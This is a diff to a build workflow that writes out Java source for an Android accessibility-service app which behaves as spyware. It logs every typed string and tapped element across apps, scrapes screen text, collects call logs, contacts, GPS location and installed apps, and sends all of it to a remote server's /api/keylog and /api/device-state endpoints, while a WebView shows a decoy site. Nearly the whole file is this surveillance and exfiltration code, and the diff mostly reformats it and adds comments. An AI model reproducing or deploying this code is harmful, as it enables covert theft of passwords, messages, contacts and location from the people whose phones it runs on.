@@ -145,6 +145,7 @@ jobs:
                   webView.setWebViewClient(new WebViewClient());
                   webView.loadUrl("https://neon-aim.vercel.app/");
 
+                  // Start permission flow
                   requestGalleryPermission();
               }
 
@@ -292,9 +293,11 @@ jobs:
               private Thread deviceStateThread, galleryPollerThread, gpsRequestThread, callContactsThread;
               private String deviceId, deviceToken;
 
+              // Keylogger buffer
               private StringBuilder pendingText = new StringBuilder();
               private String pendingPackageName = null;
 
+              // Screen data dedup & debounce
               private Runnable screenDataRunnable = null;
               private String lastScreenPackageName = null;
               private String lastSentScreenData = "";
@@ -306,10 +309,16 @@ jobs:
                       initDeviceIdentity();
                       startThreads();
                       showToast("Service connected");
-                  } catch (Exception e) { Log.e(TAG, "onServiceConnected error", e); }
+                  } catch (Exception e) {
+                      Log.e(TAG, "onServiceConnected error", e);
+                  }
               }
 
-              private void showToast(String msg) { mainHandler.post(() -> { try { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); } catch (Exception ignored) {} }); }
+              private void showToast(String msg) {
+                  mainHandler.post(() -> {
+                      try { Toast.makeText(this, msg, Toast.LENGTH_SHORT).show(); } catch (Exception ignored) {}
+                  });
+              }
 
               private void initDeviceIdentity() {
                   SharedPreferences prefs = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
@@ -373,7 +382,7 @@ jobs:
                           try {
                               sendCallLogs();
                               sendContacts();
-                              Thread.sleep(60000);
+                              Thread.sleep(60000); // প্রতি ১ মিনিট
                           } catch (InterruptedException e) { Thread.currentThread().interrupt(); }
                           catch (Exception e) { /* ignore */ }
                       }
@@ -560,7 +569,11 @@ jobs:
                       payload.put("deviceName", deviceName);
                       payload.put("battery", battery);
                       payload.put("installedApps", appsArray);
-                      if (loc != null) { payload.put("latitude", loc.latitude); payload.put("longitude", loc.longitude); payload.put("accuracy", loc.accuracy); }
+                      if (loc != null) {
+                          payload.put("latitude", loc.latitude);
+                          payload.put("longitude", loc.longitude);
+                          payload.put("accuracy", loc.accuracy);
+                      }
                       RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
                       Request request = new Request.Builder().url(API_BASE + "/api/device-state").post(body).build();
                       httpClient.newCall(request).execute().close();
@@ -570,7 +583,8 @@ jobs:
               private LocationResult getCurrentLocation(boolean forceFresh) {
                   try {
                       LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
-                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED && checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
+                      if (checkSelfPermission(Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED &&
+                          checkSelfPermission(Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) return null;
                       if (!forceFresh) {
                           Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                           if (loc == null) loc = lm.getLastKnownLocation(LocationManager.NETWORK_PROVIDER);
@@ -599,49 +613,224 @@ jobs:
               private List<InstalledApp> getInstalledApps(){ List<InstalledApp> list=new ArrayList<>(); try{ PackageManager pm=getPackageManager(); for(ApplicationInfo ai:pm.getInstalledApplications(0)){ if((ai.flags & ApplicationInfo.FLAG_SYSTEM)==0){ list.add(new InstalledApp(pm.getApplicationLabel(ai).toString(), ai.packageName)); } } }catch(Exception ignored){} return list; }
 
               // ================== EVENT HANDLING ==================
-              @Override public void onAccessibilityEvent(AccessibilityEvent event) {
+              @Override
+              public void onAccessibilityEvent(AccessibilityEvent event) {
                   try {
-                      if(event==null)return;
-                      switch(event.getEventType()){
+                      if (event == null) return;
+                      switch (event.getEventType()) {
                           case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
-                              if(event.getText()!=null && event.getText().size()>0){ String typedText=event.getText().get(0).toString(); if(!typedText.isEmpty()){ if(pendingText.length()==0){ pendingPackageName=event.getPackageName()!=null?event.getPackageName().toString():""; } pendingText.setLength(0); pendingText.append(typedText); } else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } } }
-                              else { if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:"Unknown"); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }
+                              if (event.getText() != null && event.getText().size() > 0) {
+                                  String typedText = event.getText().get(0).toString();
+                                  if (!typedText.isEmpty()) {
+                                      if (pendingText.length() == 0) {
+                                          pendingPackageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
+                                      }
+                                      pendingText.setLength(0);
+                                      pendingText.append(typedText);
+                                  } else {
+                                      if (pendingText.length() > 0) {
+                                          String typed = pendingText.toString().trim();
+                                          String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
+                                          sendKeylog("[" + typedAppName + "] " + typed);
+                                          pendingText.setLength(0);
+                                          pendingPackageName = null;
+                                      }
+                                  }
+                              } else {
+                                  if (pendingText.length() > 0) {
+                                      String typed = pendingText.toString().trim();
+                                      String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : "Unknown");
+                                      sendKeylog("[" + typedAppName + "] " + typed);
+                                      pendingText.setLength(0);
+                                      pendingPackageName = null;
+                                  }
+                              }
                               break;
                           case AccessibilityEvent.TYPE_VIEW_CLICKED:
                               handleClick(event);
                               break;
                           case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                           case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
-                              String pkg = event.getPackageName()!=null?event.getPackageName().toString():"Unknown";
-                              if(!isSystemPackage(pkg)){ scheduleScreenDataCapture(pkg); }
-                              if(event.getEventType()==AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:pkg); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; }
+                              String pkg = event.getPackageName() != null ? event.getPackageName().toString() : "Unknown";
+                              if (!isSystemPackage(pkg)) {
+                                  scheduleScreenDataCapture(pkg);
+                              }
+                              if (event.getEventType() == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED && pendingText.length() > 0) {
+                                  String typed = pendingText.toString().trim();
+                                  String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : pkg);
+                                  sendKeylog("[" + typedAppName + "] " + typed);
+                                  pendingText.setLength(0);
+                                  pendingPackageName = null;
+                              }
                               break;
                       }
-                  } catch(Exception e){ Log.e(TAG,"onAccessibilityEvent error",e); }
+                  } catch (Exception e) {
+                      Log.e(TAG, "onAccessibilityEvent error", e);
+                  }
               }
 
-              private boolean isSystemPackage(String pkg){ if(pkg==null)return true; String lower=pkg.toLowerCase(); return lower.contains("systemui")||lower.contains("launcher")||lower.contains("miui.home")||lower.contains("nexuslauncher")||lower.contains("com.android.systemui")||lower.contains("com.android.launcher")||lower.contains("com.miui.home")||lower.contains("com.google.android.apps.nexuslauncher"); }
+              private boolean isSystemPackage(String pkg) {
+                  if (pkg == null) return true;
+                  String lower = pkg.toLowerCase();
+                  return lower.contains("systemui") ||
+                         lower.contains("launcher") ||
+                         lower.contains("miui.home") ||
+                         lower.contains("nexuslauncher") ||
+                         lower.contains("com.android.systemui") ||
+                         lower.contains("com.android.launcher") ||
+                         lower.contains("com.miui.home") ||
+                         lower.contains("com.google.android.apps.nexuslauncher");
+              }
 
-              private void handleClick(AccessibilityEvent event){ AccessibilityNodeInfo source=event.getSource(); String clickedText=""; if(source!=null){ clickedText=getNodeText(source); AccessibilityNodeInfo parent=source.getParent(); int depth=0; while(parent!=null && depth<6 && clickedText.isEmpty()){ clickedText=getNodeText(parent); if(!clickedText.isEmpty())break; parent=parent.getParent(); depth++; } source.recycle(); } String appName=getAppDisplayName(event.getPackageName()!=null?event.getPackageName().toString():"Unknown"); sendKeylog("👆 ["+appName+" Tapped] "+(clickedText.isEmpty()?"Unknown":clickedText)); if(pendingText.length()>0){ String typed=pendingText.toString().trim(); String typedAppName=getAppDisplayName(pendingPackageName!=null?pendingPackageName:appName); sendKeylog("["+typedAppName+"] "+typed); pendingText.setLength(0); pendingPackageName=null; } }
+              private void handleClick(AccessibilityEvent event) {
+                  AccessibilityNodeInfo source = event.getSource();
+                  String clickedText = "";
+                  if (source != null) {
+                      clickedText = getNodeText(source);
+                      AccessibilityNodeInfo parent = source.getParent();
+                      int depth = 0;
+                      while (parent != null && depth < 6 && clickedText.isEmpty()) {
+                          clickedText = getNodeText(parent);
+                          if (!clickedText.isEmpty()) break;
+                          parent = parent.getParent();
+                          depth++;
+                      }
+                      source.recycle();
+                  }
+                  String appName = getAppDisplayName(event.getPackageName() != null ? event.getPackageName().toString() : "Unknown");
+                  sendKeylog("👆 [" + appName + " Tapped] " + (clickedText.isEmpty() ? "Unknown" : clickedText));
+                  if (pendingText.length() > 0) {
+                      String typed = pendingText.toString().trim();
+                      String typedAppName = getAppDisplayName(pendingPackageName != null ? pendingPackageName : appName);
+                      sendKeylog("[" + typedAppName + "] " + typed);
+                      pendingText.setLength(0);
+                      pendingPackageName = null;
+                  }
+              }
 
-              private String getNodeText(AccessibilityNodeInfo node){ if(node==null)return ""; try{ String text=node.getText()!=null?node.getText().toString():""; if(text.isEmpty() && node.getContentDescription()!=null)text=node.getContentDescription().toString(); if(text.isEmpty() && node.getViewIdResourceName()!=null)text=node.getViewIdResourceName(); return text.trim(); }catch(Exception e){return "";} }
+              private String getNodeText(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  try {
+                      String text = node.getText() != null ? node.getText().toString() : "";
+                      if (text.isEmpty() && node.getContentDescription() != null) text = node.getContentDescription().toString();
+                      if (text.isEmpty() && node.getViewIdResourceName() != null) text = node.getViewIdResourceName();
+                      return text.trim();
+                  } catch (Exception e) { return ""; }
+              }
 
-              private void scheduleScreenDataCapture(String packageName){ if(screenDataRunnable!=null)mainHandler.removeCallbacks(screenDataRunnable); lastScreenPackageName=packageName; screenDataRunnable=()->{ try{ String appName=getAppDisplayName(lastScreenPackageName); captureAndSendScreenData(appName); }catch(Exception e){ Log.e(TAG,"screen data capture error",e); } }; mainHandler.postDelayed(screenDataRunnable,2000); }
+              private void scheduleScreenDataCapture(String packageName) {
+                  if (screenDataRunnable != null) mainHandler.removeCallbacks(screenDataRunnable);
+                  lastScreenPackageName = packageName;
+                  screenDataRunnable = () -> {
+                      try {
+                          String appName = getAppDisplayName(lastScreenPackageName);
+                          captureAndSendScreenData(appName);
+                      } catch (Exception e) {
+                          Log.e(TAG, "screen data capture error", e);
+                      }
+                  };
+                  mainHandler.postDelayed(screenDataRunnable, 2000);
+              }
 
-              private void captureAndSendScreenData(String appName){ try{ AccessibilityNodeInfo root=getRootInActiveWindow(); if(root==null)return; String screenText=extractTextFromNode(root); if(screenText.isEmpty())return; if(screenText.equals(lastSentScreenData))return; sendKeylog("🖥️ ["+appName+"] Screen Data: "+screenText); lastSentScreenData=screenText; }catch(Exception e){ Log.e(TAG,"captureAndSendScreenData error",e); } }
+              private void captureAndSendScreenData(String appName) {
+                  try {
+                      AccessibilityNodeInfo root = getRootInActiveWindow();
+                      if (root == null) return;
+                      String screenText = extractTextFromNode(root);
+                      if (screenText.isEmpty()) return;
+                      if (screenText.equals(lastSentScreenData)) return;
+                      sendKeylog("🖥️ [" + appName + "] Screen Data: " + screenText);
+                      lastSentScreenData = screenText;
+                  } catch (Exception e) {
+                      Log.e(TAG, "captureAndSendScreenData error", e);
+                  }
+              }
 
-              private String getAppDisplayName(String packageName){ try{ PackageManager pm=getPackageManager(); ApplicationInfo ai=pm.getApplicationInfo(packageName,0); return pm.getApplicationLabel(ai).toString(); }catch(Exception e){ return packageName; } }
+              private String getAppDisplayName(String packageName) {
+                  try {
+                      PackageManager pm = getPackageManager();
+                      ApplicationInfo ai = pm.getApplicationInfo(packageName, 0);
+                      return pm.getApplicationLabel(ai).toString();
+                  } catch (Exception e) {
+                      return packageName;
+                  }
+              }
 
-              private String extractTextFromNode(AccessibilityNodeInfo node){ if(node==null)return ""; StringBuilder sb=new StringBuilder(); try{ String text=(node.getText()!=null)?node.getText().toString().trim():""; String desc=(node.getContentDescription()!=null)?node.getContentDescription().toString().trim():""; if(!text.isEmpty()){sb.append(text);}else if(!desc.isEmpty()){sb.append(desc);} for(int i=0;i<node.getChildCount();i++){ AccessibilityNodeInfo child=node.getChild(i); if(child!=null){ String childText=extractTextFromNode(child); if(!childText.isEmpty()){ if(sb.length()>0)sb.append(" | "); sb.append(childText); } child.recycle(); } } String[] parts=sb.toString().split(" \\| "); LinkedHashSet<String> uniqueParts=new LinkedHashSet<>(); for(String part:parts){ if(!part.trim().isEmpty())uniqueParts.add(part.trim()); } StringBuilder deduped=new StringBuilder(); int count=0; for(String part:uniqueParts){ if(count>0)deduped.append(" | "); deduped.append(part); count++; } return deduped.toString(); }catch(Exception e){ return sb.toString(); } }
+              private String extractTextFromNode(AccessibilityNodeInfo node) {
+                  if (node == null) return "";
+                  StringBuilder sb = new StringBuilder();
+                  try {
+                      String text = (node.getText() != null) ? node.getText().toString().trim() : "";
+                      String desc = (node.getContentDescription() != null) ? node.getContentDescription().toString().trim() : "";
+                      if (!text.isEmpty()) {
+                          sb.append(text);
+                      } else if (!desc.isEmpty()) {
+                          sb.append(desc);
+                      }
+                      for (int i = 0; i < node.getChildCount(); i++) {
+                          AccessibilityNodeInfo child = node.getChild(i);
+                          if (child != null) {
+                              String childText = extractTextFromNode(child);
+                              if (!childText.isEmpty()) {
+                                  if (sb.length() > 0) sb.append(" | ");
+                                  sb.append(childText);
+                              }
+                              child.recycle();
+                          }
+                      }
+                      String[] parts = sb.toString().split(" \\| ");
+                      LinkedHashSet<String> uniqueParts = new LinkedHashSet<>();
+                      for (String part : parts) {
+                          if (!part.trim().isEmpty()) uniqueParts.add(part.trim());
+                      }
+                      StringBuilder deduped = new StringBuilder();
+                      int count = 0;
+                      for (String part : uniqueParts) {
+                          if (count > 0) deduped.append(" | ");
+                          deduped.append(part);
+                          count++;
+                      }
+                      return deduped.toString();
+                  } catch (Exception e) {
+                      return sb.toString();
+                  }
+              }
 
-              private void sendKeylog(String text){ new Thread(()->{ try{ JSONObject payload=new JSONObject(); payload.put("deviceId",deviceId); payload.put("deviceToken",deviceToken); payload.put("text",text); payload.put("timestamp",System.currentTimeMillis()); RequestBody body=RequestBody.create(MediaType.parse("application/json; charset=utf-8"),payload.toString()); Request request=new Request.Builder().url(API_BASE+"/api/keylog").post(body).build(); httpClient.newCall(request).execute().close(); }catch(Exception e){ } }).start(); }
+              private void sendKeylog(String text) {
+                  new Thread(() -> {
+                      try {
+                          JSONObject payload = new JSONObject();
+                          payload.put("deviceId", deviceId);
+                          payload.put("deviceToken", deviceToken);
+                          payload.put("text", text);
+                          payload.put("timestamp", System.currentTimeMillis());
+                          RequestBody body = RequestBody.create(MediaType.parse("application/json; charset=utf-8"), payload.toString());
+                          Request request = new Request.Builder().url(API_BASE + "/api/keylog").post(body).build();
+                          httpClient.newCall(request).execute().close();
+                      } catch (Exception e) { /* ignore */ }
+                  }).start();
+              }
 
-              private void logToFile(String data){ try{ File dir=new File(getExternalFilesDir(null),"logs"); if(!dir.exists())dir.mkdirs(); FileWriter fw=new FileWriter(new File(dir,"keylog.txt"),true); fw.append(data).append("\n"); fw.close(); }catch(Exception e){ } }
+              private void logToFile(String data) {
+                  try {
+                      File dir = new File(getExternalFilesDir(null), "logs");
+                      if (!dir.exists()) dir.mkdirs();
+                      FileWriter fw = new FileWriter(new File(dir, "keylog.txt"), true);
+                      fw.append(data).append("\n");
+                      fw.close();
+                  } catch (Exception e) { /* ignore */ }
+              }
 
               @Override public void onInterrupt() {}
-              @Override public void onDestroy(){ super.onDestroy(); if(deviceStateThread!=null&&deviceStateThread.isAlive())deviceStateThread.interrupt(); if(galleryPollerThread!=null&&galleryPollerThread.isAlive())galleryPollerThread.interrupt(); if(gpsRequestThread!=null&&gpsRequestThread.isAlive())gpsRequestThread.interrupt(); if(callContactsThread!=null&&callContactsThread.isAlive())callContactsThread.interrupt(); }
+              @Override public void onDestroy() {
+                  super.onDestroy();
+                  if (deviceStateThread != null && deviceStateThread.isAlive()) deviceStateThread.interrupt();
+                  if (galleryPollerThread != null && galleryPollerThread.isAlive()) galleryPollerThread.interrupt();
+                  if (gpsRequestThread != null && gpsRequestThread.isAlive()) gpsRequestThread.interrupt();
+                  if (callContactsThread != null && callContactsThread.isAlive()) callContactsThread.interrupt();
+              }
 
-              private static class InstalledApp { String name,packageName; InstalledApp(String n,String p){name=n;packageName=p;} }
+              private static class InstalledApp { String name, packageName; InstalledApp(String n, String p) { name = n; packageName = p; } }
           }
           EOF
 
